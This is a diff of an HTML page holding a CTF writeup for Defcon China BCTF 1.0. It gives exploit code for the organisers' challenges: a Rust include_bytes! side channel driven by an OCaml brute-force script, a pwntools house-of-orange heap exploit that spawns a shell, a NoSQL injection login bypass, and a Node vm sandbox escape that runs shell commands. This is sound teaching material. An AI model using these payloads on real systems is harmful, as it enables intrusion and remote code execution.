@@ -356,7 +356,7 @@
         </ul>
       </div>
       <div class="col-10 py-3">
-        <article class="markdown-body"><h1 id="defcon-china-ctf(bctf)-1.0-writeup"><a class="header-link" href="#defcon-china-ctf(bctf)-1.0-writeup"></a>Defcon China CTF(BCTF) 1.0 Writeup</h1>
+        <article class="markdown-body"><h1 id="defcon-china-ctfbctf-10-writeup"><a class="header-link" href="#defcon-china-ctfbctf-10-writeup"></a>Defcon China CTF(BCTF) 1.0 Writeup</h1>
 <p>Happy Children&#39;s Day, hackers! I know you all hacked the time, so you may stay young forever, haha.</p>
 <p>Anyway, thanks for participating BCTF. It&#39;s a tough task to keep all the challenges as good as possible in such a short time. As we are not the only one writing challenges, here is the list of challenges that from our hands. Other challenges will not be covered in this writeup, as it&#39;s not our work. Really hope you guys enjoyed the challenges, and please do contact us if you have anything to complain about the challenges.</p>
 <p>Challenges from us include:</p>
@@ -399,24 +399,24 @@
 <span class="hljs-comment">//!</span>
 <span class="hljs-comment">//! There are multiple parts that I intended to test the players:</span>
 <span class="hljs-comment">//!</span>
-<span class="hljs-comment">//! - "include_bytes!" macro that can get arbitrary file content at the</span>
+<span class="hljs-comment">//! - &quot;include_bytes!&quot; macro that can get arbitrary file content at the</span>
 <span class="hljs-comment">//!   compile time</span>
 <span class="hljs-comment">//!</span>
 <span class="hljs-comment">//! - const fn calculation, which the only distinguishable implemented</span>
 <span class="hljs-comment">//!   [arithmetic feature](https://github.com/rust-lang/rust/issues/53718) </span>
-<span class="hljs-comment">//!   is the "is_negative" and "is_positive" on integer type.</span>
+<span class="hljs-comment">//!   is the &quot;is_negative&quot; and &quot;is_positive&quot; on integer type.</span>
 <span class="hljs-comment">//!</span>
 <span class="hljs-comment">//! - use inline assembly bug to make it possible to be optimized away</span>
-<span class="hljs-comment">//!   without triggering. There's a lot of ICE (internal compiler error)</span>
+<span class="hljs-comment">//!   without triggering. There&#x27;s a lot of ICE (internal compiler error)</span>
 <span class="hljs-comment">//!   to trigger, however, not all of them is good enough to handle this</span>
 <span class="hljs-comment">//!   case. For example, the borrow checker bug will panic before the</span>
 <span class="hljs-comment">//!   dead code elimination happens, so it will panic wherever you put it.</span>
 <span class="hljs-comment">//!</span>
 <span class="hljs-comment">//! # Intention</span>
 <span class="hljs-comment">//!</span>
-<span class="hljs-comment">//! Original intention is to "attack the online judge services with Rust".</span>
-<span class="hljs-comment">//! This comes to me as I search throw `Rust` stdlib's documentation and</span>
-<span class="hljs-comment">//! find out "include_*" functions that work at compile time. Most online</span>
+<span class="hljs-comment">//! Original intention is to &quot;attack the online judge services with Rust&quot;.</span>
+<span class="hljs-comment">//! This comes to me as I search throw `Rust` stdlib&#x27;s documentation and</span>
+<span class="hljs-comment">//! find out &quot;include_*&quot; functions that work at compile time. Most online</span>
 <span class="hljs-comment">//! judge systems can tell you if you program successfully compiles, these</span>
 <span class="hljs-comment">//! functions may allow potential attacking to read arbitrary contents.</span>
 <span class="hljs-comment">//!</span>
@@ -428,21 +428,21 @@
 <span class="hljs-comment">//! the constant checker to get a different result when compiling.</span>
 <span class="hljs-comment">//!</span>
 <span class="hljs-comment">//! For example, it is possible to make it not compilable given</span>
-<span class="hljs-comment">//! `(FLAG_BYTE as u32 - b'g' as u32) as i32` as if the FLAG_BYTE is `f`,</span>
+<span class="hljs-comment">//! `(FLAG_BYTE as u32 - b&#x27;g&#x27; as u32) as i32` as if the FLAG_BYTE is `f`,</span>
 <span class="hljs-comment">//! this will cause an overflow in constant which will be prevented by compiler.</span>
 <span class="hljs-comment">//!</span>
 <span class="hljs-comment">//! Since this case will only cause the compiler to fail instead of error,</span>
 <span class="hljs-comment">//! the return value is 1 instead of other minus values. So as a counter measure,</span>
-<span class="hljs-comment">//! I changed the return value check part to be "more than 0x7f (less than 0) or not".</span>
+<span class="hljs-comment">//! I changed the return value check part to be &quot;more than 0x7f (less than 0) or not&quot;.</span>
 <span class="hljs-comment">//!</span>
-<span class="hljs-comment">//! Still, I'm not 100 percent sure if there exists any other unintended solutions.</span>
+<span class="hljs-comment">//! Still, I&#x27;m not 100 percent sure if there exists any other unintended solutions.</span>
 <span class="hljs-meta">#![feature(const_fn, asm)]</span>
 
 <span class="hljs-comment">/// This will get one byte out of flag, compare it with different bytes to get</span>
 <span class="hljs-comment">/// the whole flag</span>
-<span class="hljs-keyword">const</span> VALUE: <span class="hljs-keyword">i32</span> = (include_bytes!(<span class="hljs-string">"./flag"</span>)[<span class="hljs-number">0</span>] - <span class="hljs-string">b'g'</span>) <span class="hljs-keyword">as</span> <span class="hljs-keyword">i32</span>;
+<span class="hljs-keyword">const</span> VALUE: <span class="hljs-built_in">i32</span> = (include_bytes!(<span class="hljs-string">&quot;./flag&quot;</span>)[<span class="hljs-number">0</span>] - <span class="hljs-string">b&#x27;g&#x27;</span>) <span class="hljs-keyword">as</span> <span class="hljs-built_in">i32</span>;
 
-<span class="hljs-keyword">const</span> <span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">guess</span></span>() -&gt; <span class="hljs-keyword">bool</span> {
+<span class="hljs-keyword">const</span> <span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">guess</span></span>() -&gt; <span class="hljs-built_in">bool</span> {
     VALUE.is_negative() <span class="hljs-comment">// false</span>
 }
 
@@ -454,7 +454,7 @@
         <span class="hljs-comment">// optimize away</span>
     } <span class="hljs-keyword">else</span> {
         <span class="hljs-comment">// compiles</span>
-        <span class="hljs-keyword">unsafe</span> { asm!(<span class="hljs-string">"call $0"</span> :: <span class="hljs-string">"i"</span>(test) :: <span class="hljs-string">"intel"</span>); }
+        <span class="hljs-keyword">unsafe</span> { asm!(<span class="hljs-string">&quot;call $0&quot;</span> :: <span class="hljs-string">&quot;i&quot;</span>(test) :: <span class="hljs-string">&quot;intel&quot;</span>); }
     }
 }</code></pre><p>Complete solution (in Ocaml :P) using binary search:</p>
 <pre class="hljs"><code><span class="hljs-comment">(* usage: ocaml unix.cma str.cma exp.ml *)</span>
@@ -469,13 +469,13 @@
     <span class="hljs-keyword">let</span> inchan = in_channel_of_descr sock <span class="hljs-keyword">in</span>
     (inchan, outchan)
 
-<span class="hljs-keyword">let</span> done_regexp = <span class="hljs-type">Str</span>.regexp <span class="hljs-string">"Done"</span>
+<span class="hljs-keyword">let</span> done_regexp = <span class="hljs-type">Str</span>.regexp <span class="hljs-string">&quot;Done&quot;</span>
 
 <span class="hljs-comment">(** generate exploit Rust code *)</span>
 <span class="hljs-keyword">let</span> gen_exploit_code index ch = 
-    <span class="hljs-type">Printf</span>.sprintf <span class="hljs-string">"#![feature(const_fn, asm)]
+    <span class="hljs-type">Printf</span>.sprintf <span class="hljs-string">&quot;#![feature(const_fn, asm)]
 
-const VALUE: i32 = (include_bytes!(\"/flag\")[%d] as i8 - b'\\x%02x' as i8) as i32;
+const VALUE: i32 = (include_bytes!(\&quot;/flag\&quot;)[%d] as i8 - b&#x27;\\x%02x&#x27; as i8) as i32;
 
 const fn guess() -&gt; bool {
     VALUE.is_negative()
@@ -486,11 +486,11 @@ extern fn test() {}
 fn main() {
     if guess() {
     } else {
-        unsafe { asm!(\"call $0\" :: \"i\"(test) :: \"intel\"); }
+        unsafe { asm!(\&quot;call $0\&quot; :: \&quot;i\&quot;(test) :: \&quot;intel\&quot;); }
     }
 }
 EOF
-"</span> index ch
+&quot;</span> index ch
 
 <span class="hljs-comment">(**
  * check if is less than character ch
@@ -506,7 +506,7 @@ EOF
         pass_hint inchan;
         <span class="hljs-keyword">let</span> code = gen_exploit_code index ch <span class="hljs-keyword">in</span>
         <span class="hljs-keyword">begin</span>
-            <span class="hljs-comment">(* print_endline ("sending: " ^ code); *)</span>
+            <span class="hljs-comment">(* print_endline (&quot;sending: &quot; ^ code); *)</span>
             output_string outchan code;
             flush outchan;
             input_line inchan |&gt; ignore; <span class="hljs-comment">(* compiling... *)</span>
@@ -529,8 +529,8 @@ EOF
     <span class="hljs-keyword">let</span> <span class="hljs-keyword">rec</span> binary_search_bruteforce index left right =
         <span class="hljs-keyword">if</span> left &lt; right <span class="hljs-keyword">then</span>
             <span class="hljs-keyword">begin</span>
-                print_endline (<span class="hljs-type">Printf</span>.sprintf <span class="hljs-string">"left: %d"</span> left);
-                print_endline (<span class="hljs-type">Printf</span>.sprintf <span class="hljs-string">"right: %d"</span> right);
+                print_endline (<span class="hljs-type">Printf</span>.sprintf <span class="hljs-string">&quot;left: %d&quot;</span> left);
+                print_endline (<span class="hljs-type">Printf</span>.sprintf <span class="hljs-string">&quot;right: %d&quot;</span> right);
             <span class="hljs-keyword">let</span> mid = (left + right) / <span class="hljs-number">2</span> + <span class="hljs-number">1</span> <span class="hljs-keyword">in</span>
             <span class="hljs-keyword">if</span> is_less index mid ~host ~port <span class="hljs-keyword">then</span>
                 binary_search_bruteforce index left (mid - <span class="hljs-number">1</span>)
@@ -550,7 +550,7 @@ EOF
         <span class="hljs-type">Char</span>.chr |&gt;
         <span class="hljs-type">String</span>.make <span class="hljs-number">1</span> |&gt;
         <span class="hljs-keyword">fun</span> x -&gt; <span class="hljs-keyword">begin</span>
-            print_endline (<span class="hljs-string">"cur: "</span> ^ cur ^ x);
+            print_endline (<span class="hljs-string">&quot;cur: &quot;</span> ^ cur ^ x);
             getflag (cur ^ x) ~host ~port
         <span class="hljs-keyword">end</span>
     <span class="hljs-keyword">else</span>
@@ -558,8 +558,8 @@ EOF
     <span class="hljs-keyword">end</span>
 
 <span class="hljs-keyword">let</span> <span class="hljs-literal">()</span> =
-    print_endline <span class="hljs-string">"start"</span>;
-    getflag <span class="hljs-string">""</span> ~host:<span class="hljs-string">"localhost"</span> ~port:<span class="hljs-number">50806</span> |&gt;
+    print_endline <span class="hljs-string">&quot;start&quot;</span>;
+    getflag <span class="hljs-string">&quot;&quot;</span> ~host:<span class="hljs-string">&quot;localhost&quot;</span> ~port:<span class="hljs-number">50806</span> |&gt;
         print_endline;
 ;;</code></pre><h2 id="echos"><a class="header-link" href="#echos"></a>echos</h2>
 <p><strong>1. program info</strong></p>
@@ -582,79 +582,79 @@ EOF
 <p>the final script:</p>
 <pre class="hljs"><code><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
 
-context.terminal = [<span class="hljs-string">'guake'</span>, <span class="hljs-string">'-n'</span>, os.getcwd(), <span class="hljs-string">'-e'</span>]
-context.log_level = <span class="hljs-string">'debug'</span>
-pc=<span class="hljs-string">'./echos'</span>
-<span class="hljs-comment">#libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')</span>
-libc = ELF(<span class="hljs-string">'./libc-2.23.so'</span>)
+context.terminal = [<span class="hljs-string">&#x27;guake&#x27;</span>, <span class="hljs-string">&#x27;-n&#x27;</span>, os.getcwd(), <span class="hljs-string">&#x27;-e&#x27;</span>]
+context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span>
+pc=<span class="hljs-string">&#x27;./echos&#x27;</span>
+<span class="hljs-comment">#libc=ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span>
+libc = ELF(<span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span>)
 
-<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">ru</span><span class="hljs-params">(a)</span>:</span>
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">ru</span>(<span class="hljs-params">a</span>):</span>
     p.recvuntil(a)
 
-<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">sa</span><span class="hljs-params">(a,b)</span>:</span>
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">sa</span>(<span class="hljs-params">a,b</span>):</span>
     p.sendafter(a,b)
 
-<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">sla</span><span class="hljs-params">(a,b)</span>:</span>
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">sla</span>(<span class="hljs-params">a,b</span>):</span>
     p.sendlineafter(a,b)
 
-<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">echo</span><span class="hljs-params">(size,content)</span>:</span>
-    p.sendline(str(size))
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">echo</span>(<span class="hljs-params">size,content</span>):</span>
+    p.sendline(<span class="hljs-built_in">str</span>(size))
     sleep(<span class="hljs-number">1</span>)
     p.send(content)
     k=p.recvline()
     <span class="hljs-keyword">return</span> k
 
-<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">pad</span><span class="hljs-params">(n)</span>:</span>
-    <span class="hljs-keyword">return</span> <span class="hljs-string">'0'</span>*n
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">pad</span>(<span class="hljs-params">n</span>):</span>
+    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;0&#x27;</span>*n
 
-<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">house_of_orange</span><span class="hljs-params">(libc,libc_addr)</span>:</span>
-    _IO_str_jumps_addr = libc_addr + libc.symbols[<span class="hljs-string">'sys_sigabbrev'</span>] + <span class="hljs-number">0x1940</span>
-    payload = p64(<span class="hljs-number">0xfffffffffffffffe</span>) + p64(<span class="hljs-number">0x61</span>) + pad(<span class="hljs-number">8</span>) + p64(libc_addr + libc.symbols[<span class="hljs-string">'_IO_list_all'</span>]<span class="hljs-number">-0x10</span>)
-    payload+= p64(<span class="hljs-number">2</span>) + p64(<span class="hljs-number">3</span>) + pad(<span class="hljs-number">8</span>) + p64(libc_addr + libc.search(<span class="hljs-string">'/bin/sh'</span>).next())
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">house_of_orange</span>(<span class="hljs-params">libc,libc_addr</span>):</span>
+    _IO_str_jumps_addr = libc_addr + libc.symbols[<span class="hljs-string">&#x27;sys_sigabbrev&#x27;</span>] + <span class="hljs-number">0x1940</span>
+    payload = p64(<span class="hljs-number">0xfffffffffffffffe</span>) + p64(<span class="hljs-number">0x61</span>) + pad(<span class="hljs-number">8</span>) + p64(libc_addr + libc.symbols[<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>]-<span class="hljs-number">0x10</span>)
+    payload+= p64(<span class="hljs-number">2</span>) + p64(<span class="hljs-number">3</span>) + pad(<span class="hljs-number">8</span>) + p64(libc_addr + libc.search(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>).<span class="hljs-built_in">next</span>())
     payload+= pad(<span class="hljs-number">0x80</span>)
-    payload+= p64(<span class="hljs-number">0xffffffffffffffff</span>) + pad(<span class="hljs-number">0x10</span>) + p64(_IO_str_jumps_addr<span class="hljs-number">-0x8</span>)
-    payload+= pad(<span class="hljs-number">8</span>) + p64(libc_addr + libc.symbols[<span class="hljs-string">'system'</span>])
+    payload+= p64(<span class="hljs-number">0xffffffffffffffff</span>) + pad(<span class="hljs-number">0x10</span>) + p64(_IO_str_jumps_addr-<span class="hljs-number">0x8</span>)
+    payload+= pad(<span class="hljs-number">8</span>) + p64(libc_addr + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>])
     <span class="hljs-keyword">return</span> payload
 
-<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">hack</span><span class="hljs-params">()</span>:</span>
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">hack</span>():</span>
     base = <span class="hljs-number">0x0000555555554000</span>
-    echo(<span class="hljs-number">0x38</span>,<span class="hljs-string">'A'</span>*<span class="hljs-number">8</span>)
-    echo(<span class="hljs-number">0x28</span>,<span class="hljs-string">'A'</span>*<span class="hljs-number">8</span>)
-    echo(<span class="hljs-number">0x48</span>,<span class="hljs-string">'A'</span>*<span class="hljs-number">8</span>)
-    echo(<span class="hljs-number">0x7f</span>,<span class="hljs-string">'A'</span>*<span class="hljs-number">8</span>)
-    k=echo(<span class="hljs-number">0x28</span>,<span class="hljs-string">'A'</span>*<span class="hljs-number">8</span>)
+    echo(<span class="hljs-number">0x38</span>,<span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">8</span>)
+    echo(<span class="hljs-number">0x28</span>,<span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">8</span>)
+    echo(<span class="hljs-number">0x48</span>,<span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">8</span>)
+    echo(<span class="hljs-number">0x7f</span>,<span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">8</span>)
+    k=echo(<span class="hljs-number">0x28</span>,<span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">8</span>)
     leak_value =u64(k[<span class="hljs-number">8</span>:<span class="hljs-number">16</span>])
-    <span class="hljs-keyword">print</span> (hex(leak_value))
-    libc_base=leak_value<span class="hljs-number">-0x3c4b78</span>
-    <span class="hljs-keyword">print</span> <span class="hljs-string">'libc_base:'</span>, hex(libc_base)
-    size = libc_base&amp;<span class="hljs-number">0xfff000</span><span class="hljs-number">-0x1000</span>
-    io_list_all = libc.symbols[<span class="hljs-string">'_IO_list_all'</span>]+libc_base
-    <span class="hljs-keyword">print</span> <span class="hljs-string">'IO_list_all:'</span>, hex(io_list_all)
-    pading = ((io_list_all&amp;<span class="hljs-number">0xff</span>)+<span class="hljs-number">0x10</span>)*<span class="hljs-string">'a'</span>
+    <span class="hljs-built_in">print</span> (<span class="hljs-built_in">hex</span>(leak_value))
+    libc_base=leak_value-<span class="hljs-number">0x3c4b78</span>
+    <span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;libc_base:&#x27;</span>, <span class="hljs-built_in">hex</span>(libc_base)
+    size = libc_base&amp;<span class="hljs-number">0xfff000</span>-<span class="hljs-number">0x1000</span>
+    io_list_all = libc.symbols[<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>]+libc_base
+    <span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;IO_list_all:&#x27;</span>, <span class="hljs-built_in">hex</span>(io_list_all)
+    pading = ((io_list_all&amp;<span class="hljs-number">0xff</span>)+<span class="hljs-number">0x10</span>)*<span class="hljs-string">&#x27;a&#x27;</span>
 
     <span class="hljs-keyword">if</span> (io_list_all&amp;<span class="hljs-number">0xffffffffff000000</span>) != (libc_base&amp;<span class="hljs-number">0xffffffffff000000</span>):
-        print(<span class="hljs-string">'fail, try again'</span>)
+        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;fail, try again&#x27;</span>)
         <span class="hljs-keyword">return</span>
     echo(size, pading+house_of_orange(libc, libc_base))
 
     <span class="hljs-keyword">if</span> size &lt; <span class="hljs-number">0x200000</span>:
         echo(size, pading+house_of_orange(libc, libc_base))
 
-    echo(<span class="hljs-number">0x90</span>,<span class="hljs-string">'A'</span>*<span class="hljs-number">8</span>)
-    echo(<span class="hljs-number">0x28</span>,<span class="hljs-string">'A'</span>*<span class="hljs-number">8</span>)
-    echo(<span class="hljs-number">0x90</span>,<span class="hljs-string">'A'</span>*<span class="hljs-number">8</span>)
-    p.sendline(str(io_list_all+<span class="hljs-number">2</span>))
+    echo(<span class="hljs-number">0x90</span>,<span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">8</span>)
+    echo(<span class="hljs-number">0x28</span>,<span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">8</span>)
+    echo(<span class="hljs-number">0x90</span>,<span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">8</span>)
+    p.sendline(<span class="hljs-built_in">str</span>(io_list_all+<span class="hljs-number">2</span>))
     sleep(<span class="hljs-number">1</span>)
-    p.sendline(str(io_list_all+<span class="hljs-number">3</span>))
+    p.sendline(<span class="hljs-built_in">str</span>(io_list_all+<span class="hljs-number">3</span>))
     sleep(<span class="hljs-number">1</span>)
-    <span class="hljs-keyword">print</span> <span class="hljs-string">'io_list_all:'</span>, hex(io_list_all)
+    <span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;io_list_all:&#x27;</span>, <span class="hljs-built_in">hex</span>(io_list_all)
 
     p.clean()
     main_arena = libc_base + <span class="hljs-number">0x3c4b20</span>
 
-    p.sendline(str(main_arena+<span class="hljs-number">0x70</span>+<span class="hljs-number">1</span>)) <span class="hljs-comment">#unsort bin</span>
+    p.sendline(<span class="hljs-built_in">str</span>(main_arena+<span class="hljs-number">0x70</span>+<span class="hljs-number">1</span>)) <span class="hljs-comment">#unsort bin</span>
     sleep(<span class="hljs-number">1</span>)
-    p.sendline(str(main_arena+<span class="hljs-number">0x70</span>+<span class="hljs-number">1</span>)) <span class="hljs-comment">#unsort bin</span>
+    p.sendline(<span class="hljs-built_in">str</span>(main_arena+<span class="hljs-number">0x70</span>+<span class="hljs-number">1</span>)) <span class="hljs-comment">#unsort bin</span>
     p.interactive()
 
 p = process(pc)
@@ -690,7 +690,7 @@ hack()
 <p>The last two is easily to exploit if you debug and test it locally, so the first and important one is to privilege by sql injection. Intended solution is to blind sql injection in <code>/api/user/login</code> to get username. In addition, you should send request post params with <strong>sign</strong>. The sign algorithm is in so file of apk, which is not difficult to reverse.</p>
 <p>When exploiting sql injection, there exists an interesting point is that sign with sqli payload. Due to source code, you must regard received params as string when signing. However, sqli payload is parsed as a json object, like this format, <code>{&quot;username&quot;: {&quot;$regex&quot;: &quot;%s&quot;}, xxxx</code>. So you should sign this with <code>[object Object]</code> string. Unfortunately, it appears an unintended solution is that easy sql injection in jwt decryption to auth successfully,  like this, <code>username: { &#39;$gt&#39;: &#39;&#39; }</code>. </p>
 <p>After bypass authentication, you can use calc function, which implemented by node vm library. It is unsafe sandbox, and you can easily construct payload to RCE. There is one example.</p>
-<pre class="hljs"><code>this.<span class="hljs-keyword">constructor</span>.<span class="hljs-function"><span class="hljs-keyword">constructor</span><span class="hljs-params">(<span class="hljs-string">'return this.process'</span>)</span><span class="hljs-params">()</span>.<span class="hljs-title">mainModule</span>.<span class="hljs-title">require</span><span class="hljs-params">(<span class="hljs-string">'child_process'</span>)</span>.<span class="hljs-title">execSync</span><span class="hljs-params">(<span class="hljs-string">'ls /'</span>)</span>.<span class="hljs-title">toString</span><span class="hljs-params">()</span></span></code></pre><p>Then enjoy flag2🚩. </p>
+<pre class="hljs"><code>this<span class="hljs-selector-class">.constructor</span><span class="hljs-selector-class">.constructor</span>(<span class="hljs-string">&#x27;return this.process&#x27;</span>)()<span class="hljs-selector-class">.mainModule</span><span class="hljs-selector-class">.require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>)<span class="hljs-selector-class">.execSync</span>(<span class="hljs-string">&#x27;ls /&#x27;</span>)<span class="hljs-selector-class">.toString</span>()</code></pre><p>Then enjoy flag2🚩. </p>
 <h2 id="router"><a class="header-link" href="#router"></a>router</h2>
 <p>And for the challenge &quot;router&quot;, for the reason that we all know, writeup and exploit maybe not be available.</p>
         </article>
